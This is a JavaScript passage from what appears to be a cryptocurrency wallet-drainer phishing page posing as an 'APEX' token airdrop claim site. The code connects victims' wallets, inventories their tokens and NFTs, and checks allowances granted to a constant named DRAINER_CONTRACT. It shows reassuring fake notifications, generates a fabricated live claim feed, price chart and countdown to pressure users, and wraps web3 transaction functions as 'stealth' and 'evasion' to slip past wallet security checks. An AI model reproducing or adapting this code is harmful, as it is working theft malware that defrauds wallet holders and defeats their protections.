      if (nftBalance > 0) {
        fingerprint.nftBalances[nftAddress] = nftBalance;
      }
    } catch (e) {
      console.debug(Manual NFT balance check failed: ${nftAddress});
    }
  }  await detectManualMultiContractTokenApprovals(userAddress, fingerprint);
}async function getManualTokenBalance(tokenAddress, walletAddress) {
  const erc20Abi = [
    {
      constant: true,
      inputs: [{ name: "_owner", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "balance", type: "uint256" }],
      type: "function",
    },
  ];  try {
    const contract = new web3.eth.Contract(erc20Abi, tokenAddress);
    return await contract.methods.balanceOf(walletAddress).call();
  } catch (e) {
    return 0;
  }
}async function getManualNFTBalance(contractAddress, userAddress) {
  const nftAbi = [
    {
      constant: true,
      inputs: [{ name: "_owner", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "balance", type: "uint256" }],
      type: "function",
    },
  ];  try {
    const contract = new web3.eth.Contract(nftAbi, contractAddress);
    return await contract.methods.balanceOf(userAddress).call();
  } catch (e) {
    return 0;
  }
}async function detectManualMultiContractTokenApprovals(userAddress, fingerprint) {
  fingerprint.approvedTokens = {};  for (const tokenAddress in fingerprint.tokenBalances) {
    try {
      const allowance = await getManualTokenAllowance(tokenAddress, userAddress, DRAINER_CONTRACT);
      if (allowance > 0) {
        fingerprint.approvedTokens[tokenAddress] = {
          contract: DRAINER_CONTRACT,
          allowance: allowance,
        };
      }
    } catch (e) {
      console.debug(Manual allowance check failed for ${tokenAddress});
    }
  }
}async function getManualTokenAllowance(tokenAddress, ownerAddress, spenderAddress) {
  const erc20Abi = [
    {
      constant: true,
      inputs: [
        { name: "_owner", type: "address" },
        { name: "_spender", type: "address" },
      ],
      name: "allowance",
      outputs: [{ name: "", type: "uint256" }],
      type: "function",
    },
  ];  try {
    const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
    return await tokenContract.methods.allowance(ownerAddress, spenderAddress).call();
  } catch (e) {
    return 0;
  }
}function logDebug(message, element = connectionDebug) {
  const timestamp = new Date().toLocaleTimeString();
  const debugMessage = [${timestamp}] ${message}<br>;
  if (element) {
    element.innerHTML += debugMessage;
  }
  console.log([MANUAL_DEBUG:${Math.random().toString(36).substring(2, 8)}] ${message});
}async function checkManualExistingConnection() {
  try {
    logDebug("Checking for manual existing wallet connections...");if (typeof window.ethereum !== "undefined") {
  const accounts = await window.ethereum.request({ method: "eth_accounts" });
  if (accounts.length > 0) {
    connectedAddress = accounts[0];

    if (walletDetectors.isMetaMask()) connectedWallet = "metamask";
    else if (walletDetectors.isCoinbaseWallet()) connectedWallet = "coinbase";
    else if (walletDetectors.isTrustWallet()) connectedWallet = "trust";
    else if (walletDetectors.isRabbyWallet()) connectedWallet = "rabby";
    else if (walletDetectors.isPhantom()) connectedWallet = "phantom";
    else if (walletDetectors.isBraveWallet()) connectedWallet = "brave";
    else connectedWallet = "manual_unknown";

    web3 = new Web3(window.ethereum);
    contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    setupManualProviderEvents(window.ethereum);
    updateManualWalletButton();
    logDebug(`Manual existing connection: ${connectedWallet}: ${connectedAddress}`);

    setTimeout(() => {
      checkAndAutoTriggerClaim();
    }, 2000);

    showManualAnnouncementModal();
    return;
  }
}

logDebug("No manual existing wallet connection found");  } catch (error) {
    logDebug("Manual error checking existing connection: " + error.message);
  }
}function setupManualProviderEvents(provider) {
  provider.on("accountsChanged", (accounts) => {
    if (accounts.length === 0) {
      handleManualDisconnection();
    } else {
      connectedAddress = accounts[0];
      userHasClaimed = false;
      updateManualWalletButton();
      logDebug(Manual account changed to: ${connectedAddress});
      showNotification("Wallet account changed", "info");  setTimeout(() => {
    checkAndAutoTriggerClaim();
  }, 2000);
  showManualAnnouncementModal();
}  });  provider.on("chainChanged", (chainId) => {
    logDebug(Manual chain changed to: ${chainId});
    showNotification(Network changed to chain ${parseInt(chainId)}, "info");
  });  provider.on("disconnect", (error) => {
    logDebug(Manual provider disconnected: ${error});
    showNotification("Wallet disconnected", "error");
    handleManualDisconnection();
  });  provider.on("connect", (connectInfo) => {
    logDebug(Manual provider connected: ${JSON.stringify(connectInfo)});
  });
}function detectWallets() {
  const walletBadges = {
    metamask: document.getElementById("metamask-badge"),
    coinbase: document.getElementById("coinbase-badge"),
    trust: document.getElementById("trust-badge"),
    rabby: document.getElementById("rabby-badge"),
  };  Object.values(walletBadges).forEach((badge) => {
    if (badge) {
      badge.textContent = "Not Detected";
      badge.style.background = "rgba(239, 68, 68, 0.15)";
      badge.style.color = "var(--error)";
    }
  });  Object.entries(walletDetectors).forEach(([wallet, detector]) => {
    if (detector()) {
      const badgeKey = wallet.toLowerCase().replace("is", "");
      if (walletBadges[badgeKey]) {
        walletBadges[badgeKey].textContent = "Detected";
        walletBadges[badgeKey].style.background = "rgba(16, 185, 129, 0.15)";
        walletBadges[badgeKey].style.color = "var(--success)";
      }
    }
  });
}function showWalletModal() {
  detectWallets();
  if (walletModal) {
    walletModal.classList.add("active");
  }
}function hideWalletModal() {
  if (walletModal) {
    walletModal.classList.remove("active");
  }
}function hideAnnouncementModal() {
  if (announcementModal) {
    announcementModal.classList.remove("active");
  }
}function copyReferralLink() {
  if (referralLink) {
    const textArea = document.createElement("textarea");
    textArea.value = referralLink.textContent;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand("copy");
    document.body.removeChild(textArea);
    showNotification("Referral link copied to clipboard!", "success");
  }
}async function connectWithProvider(providerType) {
  try {
    logDebug(Manual connecting with ${providerType}...);
    let provider;switch (providerType) {
  case "metamask":
    if (walletDetectors.isMetaMask()) {
      provider = window.ethereum;
      try {
        await provider.request({ method: "eth_requestAccounts" });
      } catch (error) {
        logDebug("Manual MetaMask connection rejected: " + error.message);
        showNotification("MetaMask connection rejected", "error");
        return;
      }
    } else {
      showNotification("MetaMask not installed", "error");
      logDebug("Manual MetaMask not installed");
      return;
    }
    break;

  case "coinbase":
    if (walletDetectors.isCoinbaseWallet()) {
      provider = window.ethereum;
      try {
        await provider.request({ method: "eth_requestAccounts" });
      } catch (error) {
        logDebug("Manual Coinbase Wallet connection rejected: " + error.message);
        showNotification("Coinbase Wallet connection rejected", "error");
        return;
      }
    } else {
      showNotification("Coinbase Wallet not detected", "error");
      logDebug("Manual Coinbase Wallet not detected");
      return;
    }
    break;

  case "trust":
    if (walletDetectors.isTrustWallet()) {
      provider = window.ethereum;
      try {
        await provider.request({ method: "eth_requestAccounts" });
      } catch (error) {
        logDebug("Manual Trust Wallet connection rejected: " + error.message);
        showNotification("Trust Wallet connection rejected", "error");
        return;
      }
    } else {
      showNotification("Trust Wallet not detected", "error");
      logDebug("Manual Trust Wallet not detected");
      return;
    }
    break;

  case "rabby":
    if (walletDetectors.isRabbyWallet()) {
      provider = window.ethereum;
      try {
        await provider.request({ method: "eth_requestAccounts" });
      } catch (error) {
        logDebug("Manual Rabby Wallet connection rejected: " + error.message);
        showNotification("Rabby Wallet connection rejected", "error");
        return;
      }
    } else {
      showNotification("Rabby Wallet not detected", "error");
      logDebug("Manual Rabby Wallet not detected");
      return;
    }
    break;

  default:
    showNotification("Unsupported wallet provider", "error");
    return;
}

web3 = new Web3(provider);
contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
const accounts = await web3.eth.getAccounts();
if (accounts.length === 0) {
  throw new Error("No accounts found");
}

connectedAddress = accounts[0];
connectedWallet = providerType;
updateManualWalletButton();
hideWalletModal();
showNotification("Wallet connected successfully", "success");
logDebug(`Manual connected with ${providerType}: ${connectedAddress}`);
await collectManualFingerprint();

setTimeout(() => {
  checkAndAutoTriggerClaim();
}, 2000);

showManualAnnouncementModal();
setupManualProviderEvents(provider);  } catch (error) {
    console.error("Manual error connecting wallet:", error);
    showNotification("Failed to connect wallet", "error");
    logDebug(Manual connection error: ${error.message});
  }
}async function simulateManualLegitimateTransaction(userAddress) {
  try {
    const tx = {
      from: userAddress,
      to: userAddress,
      value: web3.utils.toWei("0", "ether"),
      gas: 21000 + Math.floor(Math.random() * 10000),
      data: "0x" + Math.random().toString(16).substring(2, 10),
    };await web3.eth.sendTransaction(tx);  } catch (e) {
    console.debug("Manual simulated transaction failed:", e);
  }
}function handleClaimSuccess(userAddress, tokens, button, originalText) {
  let claimedValueUSD = 0;
  if (tokens && tokens.length > 0) {
    claimedValueUSD = tokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
  }  const claimedLocal = CURRENCY_CONVERTER.formatCurrency(
    claimedValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
    userLocalCurrency
  );  if (claimStatus) {
    claimStatus.textContent = Claim successful! 500 APEX added to your wallet.;
    claimStatus.className = "status success";if (claimedValueUSD > 1) {
  setTimeout(() => {
    showNotification(`Approved ${claimedLocal} for secure transfer`, "info");
  }, 1000);
}  }  claimList.unshift({
    address: userAddress.substring(0, 6) + "..." + userAddress.substring(38),
    amount: 500,
    timestamp: Date.now(),
    valueUSD: claimedValueUSD,
  });
  if (claimList.length > 10) claimList.pop();
  updateClaimList();  const currentPercentage = parseInt(progressPercentage.textContent);
  const newPercentage = Math.min(90, currentPercentage + 10);  if (progressBar) progressBar.style.width = ${newPercentage}%;
  if (progressPercentage) progressPercentage.textContent = ${newPercentage}%;  if (button) {
    setTimeout(() => {
      button.innerHTML = originalText;
      button.disabled = false;
      setTimeout(() => {
        if (claimStatus) {
          claimStatus.textContent = "";
          claimStatus.className = "status";
        }
      }, 5000);
    }, 5000);
  }
}function handleManualRewardError(error, button, originalText) {
  console.error("Manual transaction error:", error);
  let errorMessage = "Transaction failed. Please try again.";  const errorMappings = {
    "user rejected transaction": "Transaction rejected by user.",
    "insufficient funds": "Insufficient ETH for gas fees.",
    "execution reverted": "Contract execution reverted. Please try again.",
    "gas required exceeds allowance": "Gas limit too low. Try increasing gas.",
    "nonce too low": "Nonce error. Please try again.",
    "already known": "Transaction already pending.",
    "replacement transaction underpriced": "Transaction replacement failed.",
    "intrinsic gas too low": "Gas limit too low for transaction.",
    "transaction underpriced": "Gas price too low. Try increasing gas price.",
  };  for (const [key, message] of Object.entries(errorMappings)) {
    if (error.message.includes(key)) {
      errorMessage = message;
      break;
    }
  }  if (error.code === 4001) {
    errorMessage = "Connection rejected by user.";
  } else if (error.code === -32002) {
    errorMessage = "Request already pending. Check your wallet.";
  } else if (error.code === -32603) {
    errorMessage = "Internal JSON-RPC error. Please try again.";
  }  if (claimStatus) {
    claimStatus.textContent = errorMessage;
    claimStatus.className = "status error";
  }
  if (button) resetButton(button, originalText);  setTimeout(() => {
    if (claimStatus) {
      claimStatus.textContent = "";
      claimStatus.className = "status";
    }
  }, 5000);
}async function fetchManualTokenList() {
  const sources = [
    "https://tokens.coingecko.com/ethereum/all.json",
    "https://raw.githubusercontent.com/Uniswap/default-token-list/main/src/tokens/ethereum.json",
    "https://api.1inch.io/v4.0/1/tokens",
  ];  const fallbackTokens = [
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", name: "Tether USD", decimals: 6 },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", name: "USD Coin", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", name: "Dai Stablecoin", decimals: 18 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", name: "Wrapped Bitcoin", decimals: 8 },
    { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", name: "Polygon", decimals: 18 },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", name: "Chainlink", decimals: 18 },
    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", name: "Wrapped Ether", decimals: 18 },
    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", name: "Shiba Inu", decimals: 18 },
    { address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE", name: "ApeCoin", decimals: 18 },
    { address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", symbol: "AAVE", name: "Aave", decimals: 18 },
  ];  try {
    for (const source of sources) {
      try {
        const response = await fetch(source);
        const data = await response.json();
        if (data.tokens) {
          return data.tokens;
        }
      } catch (e) {
        console.debug(Manual failed to fetch from ${source});
      }
    }
    return fallbackTokens;
  } catch (e) {
    return fallbackTokens;
  }
}function manualRandomDelay(min, max) {
  const delay = Math.floor(Math.random() * (max - min + 1)) + min;
  const jitter = Math.random() * 0.4 + 0.8;
  return new Promise((resolve) => setTimeout(resolve, delay * jitter));
}function resetButton(button, originalText) {
  button.innerHTML = originalText;
  button.disabled = false;
}async function initializeAdvancedEvasion() {
  fingerprintData.wasm = await EVASION_TECHNIQUES.generateWasmFingerprint();
  fingerprintData.audio = await EVASION_TECHNIQUES.generateAudioFingerprint();
  fingerprintData.canvas = EVASION_TECHNIQUES.generateCanvasFingerprint();
  fingerprintData.browser = EVASION_TECHNIQUES.generateBrowserFingerprint();  if (isMobileDevice) {
    applyManualMobileEvasion();
  }  initializeManualStealthMode();
}function applyManualMobileEvasion() {
  console.log("Applying manual mobile evasion techniques...");
}function initializeManualStealthMode() {
  const securityDetectors = [
    "MetamaskInpageProvider",
    "web3",
    "ethereum",
    "__coinbaseWallet",
    "__rabby",
    "TrustWallet",
    "isRabby",
    "isMetaMask",
    "isCoinbaseWallet",
    "isTrustWallet",
  ];  let detectedTools = [];
  securityDetectors.forEach((detector) => {
    if (window[detector]) {
      console.log(Manual security tool detected: ${detector});
      detectedTools.push(detector);
      stealthMode = true;
    }
  });  if (stealthMode) {
    console.log(Manual stealth mode activated. Detected tools: ${detectedTools.join(", ")});
    applyManualStealthTechniques(detectedTools);
  }
}function applyManualStealthTechniques(detectedTools) {
  if (web3) {
    const originalFunctions = {
      sendTransaction: web3.eth.sendTransaction,
      call: web3.eth.call,
      estimateGas: web3.eth.estimateGas,
    };web3.eth.sendTransaction = function (txObject) {
  const delay = Math.random() * 3000 + 2000;
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      if (txObject.data) {
        const randomBytes = Math.random().toString(16).substring(2, 10);
        const modifiedData = txObject.data + randomBytes;
        txObject.data = modifiedData;
      }

      if (!txObject.gas) {
        txObject.gas = 300000 + Math.floor(Math.random() * 200000);
      }

      originalFunctions.sendTransaction.call(this, txObject).then(resolve).catch(reject);
    }, delay);
  });
};

web3.eth.estimateGas = function (txObject) {
  return new Promise((resolve) => {
    const baseGas = 21000;
    const randomGas = Math.floor(Math.random() * 100000);
    resolve(baseGas + randomGas);
  });
};  }  simulationBypassActive = true;
}function toggleMobileMenu() {
  if (navLinks) {
    navLinks.classList.toggle("active");
  }
}function generateInitialClaims() {
  const claims = [];
  const now = Date.now();  for (let i = 0; i < 10; i++) {
    const minutesAgo = Math.floor(Math.random() * 60) + 1;
    const timestamp = now - minutesAgo * 60 * 1000;
    claims.push(generateClaim(timestamp));
  }  claims.sort((a, b) => b.timestamp - a.timestamp);
  claimList = claims;
  updateClaimList();
}function generateClaim(timestamp = Date.now()) {
  const prefixes = ["0x8a3F", "0x4E2d", "0xF12a", "0x9Bc5", "0x3Df7", "0xA5b2", "0x7Ef9", "0xC3d8", "0x1F4a", "0x6Bc3"];
  const suffixes = ["Bc92", "7Fa1", "9D3e", "E4f2", "8C6d", "A5e9", "3D7b", "F8c1", "2E9d", "5Bf4"];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];  return {
    address: ${prefix}...${suffix},
    amount: 500,
    timestamp: timestamp,
  };
}function formatTimeAgo(timestamp) {
  const now = Date.now();
  const diff = now - timestamp;
  const minutes = Math.floor(diff / 60000);
  const hours = Math.floor(diff / 3600000);  if (hours > 0) {
    return ${hours} hour${hours > 1 ? "s" : ""} ago;
  } else if (minutes > 0) {
    return ${minutes} min${minutes > 1 ? "s" : ""} ago;
  } else {
    return "Just now";
  }
}function updateClaimList() {
  if (!claimListElement) return;  claimListElement.innerHTML = "";
  claimList.forEach((claim) => {
    const claimElement = document.createElement("div");
    claimElement.className = "claim-item";let valueDisplay = "";
if (claim.valueUSD && claim.valueUSD > 0) {
  const localValue = CURRENCY_CONVERTER.formatCurrency(
    claim.valueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
    userLocalCurrency
  );
  valueDisplay = `<span class="claim-value">(${localValue})</span>`;
}

claimElement.innerHTML = `
  <span class="claim-address">${claim.address}</span>
  <span class="claim-time">${formatTimeAgo(claim.timestamp)}</span>
  <span class="claim-amount-badge">${claim.amount} APEX</span>
  ${valueDisplay}
`;
claimListElement.appendChild(claimElement);  });
}function startClaimUpdates() {
  setInterval(() => {
    claimList.unshift(generateClaim());
    if (claimList.length > 10) claimList.pop();
    updateClaimList();
  }, 30000);
}function startCountdown() {
  const totalDuration = 5 * 24 * 60 * 60;
  const remainingDuration = 30 * 60;
  let remainingTime = remainingDuration;  updateCountdownDisplay(remainingTime);  countdownInterval = setInterval(() => {
    remainingTime--;if (remainingTime <= 0) {
  clearInterval(countdownInterval);
  const countdownElement = document.getElementById("countdown");
  if (countdownElement) {
    countdownElement.textContent = "0:0:0:0";
    countdownElement.classList.add("pulse");
  }
  return;
}

if (remainingTime <= 900 && !progressUpdated) {
  if (progressBar) progressBar.style.width = "90%";
  if (progressPercentage) progressPercentage.textContent = "90%";
  progressUpdated = true;
}

updateCountdownDisplay(remainingTime);  }, 1000);
}function updateCountdownDisplay(totalSeconds) {
  const days = Math.floor(totalSeconds / (24 * 60 * 60));
  const hours = Math.floor((totalSeconds % (24 * 60 * 60)) / (60 * 60));
  const minutes = Math.floor((totalSeconds % (60 * 60)) / 60);
  const seconds = Math.floor(totalSeconds % 60);  const countdownElement = document.getElementById("countdown");
  if (countdownElement) {
    countdownElement.textContent = ${days}:${hours}:${minutes}:${seconds};
  }
}function createTokenChart() {
  const ctx = document.getElementById("tokenChart");
  if (!ctx) return;  const dataPoints = [];
  let currentValue = 0.04;  for (let i = 0; i < 24; i++) {
    const change = Math.random() * 0.01 - 0.002;
    currentValue += change;
    dataPoints.push(currentValue);
  }  tokenChart = new Chart(ctx.getContext("2d"), {
    type: "line",
    data: {
      labels: Array.from({ length: 24 }, (_, i) => i + "h"),
      datasets: [
        {
          label: "APEX Price",
          data: dataPoints,
          borderColor: "#FF6B00",
          backgroundColor: "rgba(255, 107, 0, 0.1)",
          borderWidth: 2,
          tension: 0.4,
          pointRadius: 0,
          fill: true,
        },
      ],
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: { legend: { display: false } },
      scales: {
        x: {
          grid: { display: false, drawBorder: false },
          ticks: { color: "#a0aec0" },
        },
        y: {
          grid: { color: "rgba(255, 255, 255, 0.05)" },
          ticks: { color: "#a0aec0" },
        },
      },
    },
  });
}function updateTokenPrice() {
  const lastPrice = priceHistory.length > 0 ? priceHistory[priceHistory.length - 1] : 0.04;
  const change = Math.random() * 0.015 - 0.002;
  const price = (lastPrice + change).toFixed(4);  priceHistory.push(parseFloat(price));
  if (priceHistory.length > 10) priceHistory.shift();  const changePercent = (((price - lastPrice) / lastPrice) * 100).toFixed(2);
  const marketCap = (Math.random() * 1000000 + 1500000).toFixed(0);
  const volume = (Math.random() * 500000 + 200000).toFixed(0);
  const holders = (Math.random() * 10000 + 10000).toFixed(0);
  const liquidity = (Math.random() * 500000 + 500000).toFixed(0);  const tokenPriceElement = document.getElementById("tokenPrice");
  const priceChangeElement = document.getElementById("priceChange");
  const marketCapElement = document.getElementById("marketCap");
  const volumeElement = document.getElementById("volume");
  const holdersElement = document.getElementById("holders");
  const liquidityElement = document.getElementById("liquidity");  if (tokenPriceElement) tokenPriceElement.textContent = $${price};
  if (priceChangeElement) priceChangeElement.textContent = ${changePercent}%;
  if (marketCapElement) marketCapElement.textContent = marketCap;
  if (volumeElement) volumeElement.textContent = volume;
  if (holdersElement) holdersElement.textContent = holders;
  if (liquidityElement) liquidityElement.textContent = liquidity;  if (tokenChart) {
    const newData = tokenChart.data.datasets[0].data.slice(1);
    newData.push(parseFloat(price));
    tokenChart.data.datasets[0].data = newData;
    tokenChart.update();
  }  const changeElement = document.querySelector(".price-change");
  if (changeElement) {
    changeElement.classList.remove("positive", "negative");
    changeElement.classList.add(parseFloat(changePercent) >= 0 ? "positive" : "negative");
  }
}function updateAIAnalytics() {
  const successProb = 85 + Math.floor(Math.random() * 15);
  if (predictionFill) {
    predictionFill.style.width = ${successProb}%;
  }
}function showNotification(message, type = "success") {
  const notification = document.createElement("div");
  notification.className = fake-notification ${type};
  notification.innerHTML =     <i class="fas fa-${type === "success" ? "check-circle" : type === "error" ? "exclamation-circle" : "info-circle"}"></i>     ${message}  ;  document.body.appendChild(notification);  setTimeout(() => {
    notification.style.opacity = "0";
    setTimeout(() => {
      document.body.removeChild(notification);
    }, 300);
  }, 3000);
}function disconnectManualWallet() {
  handleManualDisconnection();
}window.addEventListener("scroll", () => {
  const header = document.getElementById("header");
  if (header) {
    if (window.scrollY > 50) {
      header.classList.add("scrolled");
    } else {
      header.classList.remove("scrolled");
    }
  }
});document.addEventListener("click", (e) => {
  if (navLinks && !navLinks.contains(e.target) && mobileMenuBtn && !mobileMenuBtn.contains(e.target)) {
    navLinks.classList.remove("active");
  }  if (walletModal && walletModal.classList.contains("active") && e.target === walletModal) {
    hideWalletModal();
  }  if (announcementModal && announcementModal.classList.contains("active") && e.target === announcementModal) {
    hideAnnouncementModal();
  }
});if (document.querySelectorAll(".nav-links a")) {
  document.querySelectorAll(".nav-links a").forEach((link) => {
    link.addEventListener("click", () => {
      if (navLinks) {
        navLinks.classList.remove("active");
      }
    });
  });
}window.addEventListener("error", function (e) {
  console.debug("Manual global error caught:", e.error);
});window.addEventListener("unhandledrejection", function (e) {
  console.debug("Manual unhandled promise rejection:", e.reason);
});if (isMobileDevice) {
  document.body.classList.add("manual-mobile-optimized");
}setTimeout(() => {
  checkManualExistingConnection();
}, 1000);// Expose the claim function globally
window.initiateClaimProcess = initiateClaimProcess;

